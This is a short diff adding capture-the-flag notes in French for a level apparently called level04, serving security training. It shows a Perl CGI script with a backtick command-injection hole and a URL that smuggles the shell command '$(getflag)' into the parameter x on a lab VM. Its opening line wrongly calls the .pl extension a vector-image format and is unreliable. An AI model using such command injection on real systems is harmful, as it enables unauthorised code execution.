@@ -1,0 +1,6 @@
+.pl extension = image qui contient des images vectorielles en deux et trois dimensions
+
+> cat level04.pl
+print `echo $y 2>&1`;
+
+(navigator) http://$(VM_IP):4747?x=$(getflag)
